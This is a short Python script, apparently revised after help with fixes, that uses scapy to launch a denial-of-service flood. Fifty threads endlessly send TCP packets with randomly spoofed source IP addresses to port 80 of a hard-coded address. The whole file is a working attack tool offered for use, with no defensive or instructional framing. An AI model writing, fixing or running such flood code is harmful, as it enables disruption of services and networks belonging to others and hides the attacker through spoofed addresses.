from scapy.all import *
import random
import threading # Import added here

def ddos_attack(target_ip, target_port):
    while True:
        src_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        # Using sendp to handle the Ethernet layer
        packet = Ether(dst="ff:ff:ff:ff:ff:ff") / IP(src=src_ip, dst=target_ip) / TCP(dport=target_port) / "Hello, World!"
        sendp(packet, verbose=False) # It has been changed to sendp

# Using the script
target_ip = "192.168.1.25"
target_port = 80
for _ in range(50):
    # The function name has been corrected here to match ddos ​​attack
    t = threading.Thread(target=ddos_attack, args=(target_ip, target_port))
    t.start()
